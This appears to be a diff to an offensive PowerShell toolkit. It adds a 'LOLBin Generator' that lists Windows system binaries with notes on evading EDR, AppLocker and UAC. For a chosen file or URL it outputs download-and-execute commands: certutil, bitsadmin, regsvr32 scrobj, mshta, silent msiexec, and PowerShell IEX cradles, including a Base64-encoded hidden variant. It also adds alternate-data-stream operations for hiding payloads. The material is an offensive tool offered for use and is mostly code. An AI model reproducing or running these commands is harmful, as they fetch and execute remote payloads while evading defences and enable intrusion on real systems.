+    certutil    = @{ Desc='Download file, decode Base64/hex, or execute';                  OS='All Windows';                                    Note='Network to non-cert URLs flagged by many EDRs';                             Types=@('*') }
+    bitsadmin   = @{ Desc='Background download via BITS service';                          OS='All Windows (deprecated but present)';           Note='Deprecated since Win 7';                                                    Types=@('*') }
+    powershell  = @{ Desc='Download cradles and execution one-liners';                     OS='All Windows';                                    Note='ScriptBlock logging + AMSI active on Win 10+. Use -enc and obfuscation';    Types=@('*','.ps1','.exe','.dll') }
+    msiexec     = @{ Desc='Install/execute MSI package locally or from URL';               OS='All Windows';                                    Note='UAC prompt possible without /quiet flag';                                    Types=@('.msi') }
+    odbcconf    = @{ Desc='Execute DLL via ODBC config action';                            OS='All Windows';                                    Note='Very low detection. DLL must export DllRegisterServer';                     Types=@('.dll','.rsp') }
+    ieexec      = @{ Desc='Download and execute via IE engine';                            OS='REMOVED in Win 11 — requires Internet Explorer'; Note='Works on Win 10 and earlier only';                                          Types=@('*') }
+    cmstp       = @{ Desc='Execute INF — UAC bypass + AppLocker bypass';                   OS='All Windows';                                    Note='UAC bypass patched in some builds. Execution still works';                   Types=@('.inf') }
+    cscript     = @{ Desc='Execute script files';                                          OS='All Windows';                                    Note='WSH may be disabled via GPO in hardened environments';                      Types=@('.vbs','.js','.wsf') }
+    wscript     = @{ Desc='Execute script files (GUI host)';                               OS='All Windows';                                    Note='WSH may be disabled via GPO in hardened environments';                      Types=@('.vbs','.js','.wsf') }
+    installutil = @{ Desc='Execute .NET assembly — bypasses AppLocker';                    OS='All Windows with .NET Framework';                Note='Assembly must implement System.Configuration.Install.Installer';             Types=@('.exe','.dll') }
+    regasm      = @{ Desc='Execute .NET assembly via COM registration';                    OS='All Windows with .NET Framework';                Note='Low detection. DLL needs COM-registerable class';                           Types=@('.dll') }
+    regsvcs     = @{ Desc='Execute .NET DLL via COM+ Services';                            OS='All Windows with .NET Framework';                Note='Similar to regasm — requires COM+ compatible DLL';                          Types=@('.dll') }
+    forfiles    = @{ Desc='Execute command via file search — cmd bypass';                  OS='All Windows';                                    Note='Good when cmd.exe is restricted. Very low monitoring';                      Types=@('*') }
+    pcalua      = @{ Desc='Execute via Program Compatibility Assistant';                   OS='All Windows';                                    Note='Very low detection — rarely in EDR rule sets';                              Types=@('*') }
+}
+
+function Get-B64PS([string]$s) {
+    $bytes = [System.Text.Encoding]::Unicode.GetBytes($s)
+    return [Convert]::ToBase64String($bytes)
+}
+
+function Get-LolBinCommands {
+    param([string]$Name, [string]$File, [string]$Url, [string]$Arg, [string]$Ext)
+
+    $f = if ($File) { $File } else { if ($Url) { [System.IO.Path]::GetFileName($Url.Split('?')[0]) } else { 'payload' } }
+    $u = if ($Url)  { $Url }  else { 'http://host/payload' }
+    $a = if ($Arg)  { $Arg }  else { 'EntryPoint' }
+
+    switch ($Name.ToLower()) {
+        'rundll32' {
+            switch ($Ext) {
+                '.dll' { return @(
+                    "rundll32.exe $f,$a",
+                    "rundll32.exe javascript:`"\..\mshtml,RunHTMLApplication `";document.write();GetObject(`"script:$f`")"
+                )}
+                '.sct' { return @(
+                    "rundll32.exe javascript:`"\..\mshtml,RunHTMLApplication `";GetObject(`"script:$f`")"
+                )}
+                '.hta' { return @(
+                    "rundll32.exe javascript:`"\..\mshtml,RunHTMLApplication `";document.write();new%20ActiveXObject(`"WScript.Shell`").Run(`"$f`")"
+                )}
+                default { return @("rundll32.exe $f,$a") }
+            }
+        }
+        'regsvr32' {
+            switch ($Ext) {
+                '.dll' { return @("regsvr32.exe /s $f", "regsvr32.exe /s /u $f") }
+                '.sct' { return @(
+                    "regsvr32.exe /s /n /u /i:$f scrobj.dll",
+                    "regsvr32.exe /s /n /u /i:$u scrobj.dll"
+                )}
+                default { return @("regsvr32.exe /s /n /u /i:$u scrobj.dll") }
+            }
+        }
+        'mshta' {
+            return @(
+                "mshta.exe $f",
+                "mshta.exe `"$u`"",
+                "mshta vbscript:Execute(`"CreateObject(`"`"Wscript.Shell`"`").Run `"`"$f`"`":close`")"
+            )
+        }
+        'wmic' {
+            switch ($Ext) {
+                '.xsl' { return @(
+                    "wmic process get brief /format:`"$f`"",
+                    "wmic process get brief /format:`"$u`"",
+                    "wmic os get /format:`"$f`""
+                )}
+                '.exe' { return @(
+                    "wmic process call create `"$f`"",
+                    "wmic /node:127.0.0.1 process call create `"$f`""
+                )}
+                default { return @("wmic process get brief /format:`"$u`"") }
+            }
+        }
+        'certutil' {
+            return @(
+                "certutil.exe -urlcache -split -f `"$u`" $f",
+                "certutil.exe -decode $f output.exe",
+                "certutil.exe -decodehex $f output.exe",
+                "certutil.exe -verifyctl -f -split `"$u`""
+            )
+        }
+        'bitsadmin' {
+            return @(
+                "bitsadmin /transfer job /download /priority high `"$u`" `"%TEMP%\$([System.IO.Path]::GetFileName($f))`"",
+                "bitsadmin /transfer job `"$u`" %TEMP%\$([System.IO.Path]::GetFileName($f)) & bitsadmin /complete job"
+            )
+        }
+        'powershell' {
+            $cradle1 = "IEX(New-Object Net.WebClient).DownloadString('$u')"
+            $enc     = Get-B64PS "IEX(irm '$u')"
+            switch ($Ext) {
+                '.ps1' { return @(
+                    "powershell -ep bypass -nop -w hidden -f `"$f`"",
+                    "powershell -ep bypass -nop -c `"& '$f'`""
+                )}
+                '.exe' { return @(
+                    "powershell -ep bypass -c `"Start-Process '$f'`"",
+                    "powershell -ep bypass -c `"[Diagnostics.Process]::Start('$f')`""
+                )}
+                default { return @(
+                    "powershell -ep bypass -nop -w hidden -c `"$cradle1`"",
+                    "powershell -ep bypass -nop -enc $enc",
+                    "powershell -ep bypass -c `"(New-Object Net.WebClient).DownloadFile('$u','$f')`"",
+                    "powershell -ep bypass -c `"& {`$d=(New-Object Net.WebClient).DownloadData('$u');[IO.File]::WriteAllBytes('$f',`$d)}`""
+                )}
+            }
+        }
+        'msiexec' {
+            return @(
+                "msiexec /quiet /i $f",
+                "msiexec /quiet /i `"$u`"",
+                "msiexec /q /i $f TRANSFORMS=evil.mst"
+            )
+        }
+        'odbcconf' {
+            switch ($Ext) {
+                '.dll' { return @("odbcconf.exe /a {REGSVR $f}", "odbcconf.exe /s /a {REGSVR $f}") }
+                '.rsp' { return @("odbcconf.exe /f $f") }
+                default { return @("odbcconf.exe /a {REGSVR $f}") }
+            }
+        }
+        'ieexec'      { return @("ieexec.exe $u") }
+        'cmstp'       { return @("cmstp.exe /s /ns $f", "cmstp.exe /au $f") }
+        'cscript'     { return @("cscript.exe //nologo $f") }
+        'wscript'     { return @("wscript.exe //nologo $f") }
+        'installutil' { return @(
+            "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U $f",
+            "C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U $f"
+        )}
+        'regasm'  { return @("C:\Windows\Microsoft.NET\Framework64\v4.0.30319\RegAsm.exe /U $f") }
+        'regsvcs' { return @("C:\Windows\Microsoft.NET\Framework64\v4.0.30319\RegSvcs.exe $f") }
+        'forfiles' { return @(
+            "forfiles /p C:\Windows\System32 /m notepad.exe /c `"$f`"",
+            "forfiles /p C:\Windows\System32 /m calc.exe /c `"cmd /c $f`""
+        )}
+        'pcalua'  { return @("pcalua.exe -a $f", "pcalua.exe -a $f -d C:\Windows\System32") }
+        default   { throw "Unknown LOLBin: $Name" }
+    }
+}
+
+function Invoke-Generate {
+    # List mode
+    if ($List) {
+        Write-Host ""
+        Write-Host "  Available LOLBins:" -ForegroundColor Cyan
+        Write-Host ""
+        foreach ($entry in $LolBinDB.GetEnumerator()) {
+            Write-Host "  $($entry.Key.PadRight(14)) " -NoNewline -ForegroundColor Green
+            Write-Host $entry.Value.Desc
+            $osColor = if ($entry.Value.OS -match '^REMOVED') { 'Red' } else { 'Cyan' }
+            Write-Host "    os   : $($entry.Value.OS)" -ForegroundColor $osColor
+            Write-Host "    note : $($entry.Value.Note)" -ForegroundColor Yellow
+            Write-Host "    types: $($entry.Value.Types -join ', ')" -ForegroundColor DarkGray
+            Write-Host ""
+        }
+        Write-Host ""
+        return
+    }
+
+    # Resolve extension
+    $ext = ''
+    if ($LolBinFile) { $ext = [System.IO.Path]::GetExtension($LolBinFile).ToLower() }
+    elseif ($LolBinUrl) {
+        $path = $LolBinUrl.Split('?')[0]
+        $ext  = [System.IO.Path]::GetExtension($path).ToLower()
+    }
+    if (-not $ext) { $ext = '*' }
+
+    # Filter compatible LOLBins
+    $compatible = [ordered]@{}
+    foreach ($entry in $LolBinDB.GetEnumerator()) {
+        if ($entry.Value.Types -contains '*' -or $entry.Value.Types -contains $ext -or $ext -eq '*') {
+            $compatible[$entry.Key] = $entry.Value
+        }
+    }
+
+    if ($compatible.Count -eq 0) {
+        throw "No LOLBins found for extension '$ext'."
+    }
+
+    # Select LOLBin
+    $chosenName = $LolBin
+    if (-not $chosenName) {
+        Write-Host ""
+        Write-Host "  ┌─────────────────────────────────────────────┐" -ForegroundColor Magenta
+        Write-Host "  │           LOLBin Generator                  │" -ForegroundColor Magenta
+        Write-Host "  │  Extension : $($ext.PadRight(32))│" -ForegroundColor Magenta
+        Write-Host "  ├─────────────────────────────────────────────┤" -ForegroundColor Magenta
+        $names = @($compatible.Keys)
+        for ($i = 0; $i -lt $names.Count; $i++) {
+            $n    = $names[$i]
+            $desc = $compatible[$n].Desc
+            $desc = if ($desc.Length -gt 26) { $desc.Substring(0,26) } else { $desc }
+            Write-Host ("  │  [{0,2}] {1,-14} {2,-26}│" -f ($i+1), $n, $desc) -ForegroundColor Magenta
+        }
+        Write-Host "  └─────────────────────────────────────────────┘" -ForegroundColor Magenta
+        $raw = Read-Host "  Select LOLBin [#]"
+        $idx = [int]$raw - 1
+        if ($idx -lt 0 -or $idx -ge $names.Count) { throw "Invalid selection." }
+        $chosenName = $names[$idx]
+    }
+
+    if (-not $LolBinDB.Contains($chosenName)) {
+        throw "Unknown LOLBin '$chosenName'. Run with -List to see available options."
+    }
+
+    $cmds = Get-LolBinCommands -Name $chosenName -File $LolBinFile -Url $LolBinUrl -Arg $LolBinArg -Ext $ext
+
+    Write-Host ""
+    Write-Host "  LOLBin    : $chosenName"  -ForegroundColor Cyan
+    Write-Host "  Purpose   : $($LolBinDB[$chosenName].Desc)" -ForegroundColor Cyan
+    $osVal = $LolBinDB[$chosenName].OS
+    $osColor2 = if ($osVal -match '^REMOVED') { 'Red' } else { 'Cyan' }
+    Write-Host "  OS        : $osVal" -ForegroundColor $osColor2
+    if ($LolBinDB[$chosenName].Note) { Write-Host "  Note      : $($LolBinDB[$chosenName].Note)" -ForegroundColor Yellow }
+    if ($LolBinFile) { Write-Host "  File      : $LolBinFile" -ForegroundColor Cyan }
+    if ($LolBinUrl)  { Write-Host "  URL       : $LolBinUrl"  -ForegroundColor Cyan }
+    Write-Host ""
+    Write-Host "  ┌─────────────────────────────────────────────────────────────┐" -ForegroundColor Yellow
+    Write-Host "  │                     Generated Commands                      │" -ForegroundColor Yellow
+    Write-Host "  └─────────────────────────────────────────────────────────────┘" -ForegroundColor Yellow
+
+    for ($i = 0; $i -lt $cmds.Count; $i++) {
+        Write-Host ""
+        Write-Host "  [$($i+1)] " -NoNewline -ForegroundColor Green
+        Write-Host $cmds[$i] -ForegroundColor White
+    }
+
+    if ($Output) {
+        $lines = @("# LOLBin: $chosenName", "# $($LolBinDB[$chosenName].Desc)", "")
+        if ($LolBinFile) { $lines += "# File : $LolBinFile" }
+        if ($LolBinUrl)  { $lines += "# URL  : $LolBinUrl" }
+        $lines += ""
+        for ($i = 0; $i -lt $cmds.Count; $i++) {
+            $lines += "# Variant $($i+1)"
+            $lines += $cmds[$i]
+            $lines += ""
+        }
+        $lines | Set-Content -Path $Output -Encoding UTF8
+        Write-Host "[+] Commands saved → $Output" -ForegroundColor Green
+    }
+    Write-Host ""
+}
+
 # ═══════════════════════════════════════════════════════════════════════════════
 #  ENTRY POINT
 # ═══════════════════════════════════════════════════════════════════════════════
@@ -550,59 +827,45 @@ Write-Banner
 
 switch ($Mode) {
 
-    'Embed' {
-        if (-not $Carrier) { throw "-Carrier is required for Embed mode." }
-        if (-not $Payload) { throw "-Payload is required for Embed mode." }
-        if (-not $Output)  { throw "-Output is required for Embed mode."  }
-
-        # Optionally encode the PAYLOAD before embedding
-        $payloadWork  = $Payload
-        $payloadIsTemp = $false
-        if ($Encode) {
-            Write-Host "[*] Encoding payload before embedding..." -ForegroundColor Cyan
-            $payloadWork   = Invoke-EncodingMenu -FilePath $Payload
-            $payloadIsTemp = ($payloadWork -ne $Payload)
-        }
-
-        # Embed
-        $workFile = Invoke-Embed -CarrierPath $Carrier -PayloadPath $payloadWork -OutPath $Output
-
-        # Clean up encoded payload temp now that it is embedded
-        if ($payloadIsTemp -and (Test-Path $payloadWork)) {
-            Remove-Item $payloadWork -Force
-            Write-Host "  [~] Cleaned up temp file: $payloadWork" -ForegroundColor DarkGray
-        }
-
-        # Post-process the OUTPUT polyglot (extension rename, header spoof, hashes)
-        # Skip re-encoding since we already encoded the payload above
-        $encodeSwitch = $Encode
-        $Encode       = $false
-        Invoke-PostProcess -WorkFile $workFile -ProtectedFiles @($Carrier, $Output) | Out-Null
-        $Encode       = $encodeSwitch
-    }
-
-    'Extract' {
-        if (-not $Carrier) { throw "-Carrier is required for Extract mode." }
-        if (-not $Output)  { throw "-Output is required for Extract mode."  }
-
-        $workFile = Invoke-Extract -CarrierPath $Carrier -OutPath $Output
-        Invoke-PostProcess -WorkFile $workFile -ProtectedFiles @($Carrier, $Output) | Out-Null
-    }
-
     'Info' {
         if (-not $Carrier) { throw "-Carrier is required for Info mode." }
         Invoke-Info -FilePath $Carrier
         if ($ShowHashes) { Show-Hashes $Carrier }
+        if ($Encode)     { Invoke-EncodingMenu -FilePath $Carrier | Out-Null }
+    }
+
+    'Generate' {
+        Invoke-Generate
     }
 
     'Util' {
-        # Pure file-utility mode — no embedding
-        $target = if ($Carrier) { $Carrier } elseif ($Output) { $Output } else {
-            throw "Provide -Carrier (source file) for Util mode."
-        }
-        if (!(Test-Path $target)) { throw "File not found: $target" }
+        if (-not $Carrier) { throw "-Carrier is required for Util mode." }
+        if (-not (Test-Path $Carrier)) { throw "File not found: $Carrier" }
 
-        Write-Host "[*] File: $target" -ForegroundColor Cyan
-        Invoke-PostProcess -WorkFile $target -ProtectedFiles @($target) | Out-Null
+        # ── ADS operations — mutually exclusive with normal util flow ──────────
+        if ($AdsWrite) {
+            if (-not $AdsStream) { throw "-AdsStream NAME is required with -AdsWrite." }
+            Invoke-AdsWrite -CarrierPath $Carrier -StreamName $AdsStream -PayloadPath $AdsWrite
+            return
+        }
+        if ($AdsRead) {
+            if (-not $AdsStream) { throw "-AdsStream NAME is required with -AdsRead." }
+            if (-not $Output)    { throw "-Output is required with -AdsRead." }
+            Invoke-AdsRead -CarrierPath $Carrier -StreamName $AdsStream -OutputPath $Output
+            return
+        }
+        if ($AdsList) {
+            Invoke-AdsList -CarrierPath $Carrier
+            return
+        }
+        if ($AdsDelete) {
+            if (-not $AdsStream) { throw "-AdsStream NAME is required with -AdsDelete." }
+            Invoke-AdsDelete -CarrierPath $Carrier -StreamName $AdsStream
+            return
+        }
+
+        # ── Normal util flow ───────────────────────────────────────────────────
+        Write-Host "[*] File: $Carrier" -ForegroundColor Cyan
+        Invoke-PostProcess -WorkFile $Carrier -ProtectedFiles @($Carrier) | Out-Null
     }
 }
